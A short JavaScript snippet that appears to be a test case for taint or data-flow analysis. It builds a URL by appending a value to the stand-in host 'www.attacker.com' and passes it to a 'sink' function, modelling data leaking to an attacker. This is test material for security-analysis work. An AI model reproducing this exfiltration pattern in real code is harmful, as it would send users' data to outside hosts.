var i =  Math.floor((Math.random() * 10) + 1); 

var h = lbl(i);

url = urll("www.attacker.com" + h);

sink('Sink', '', url);


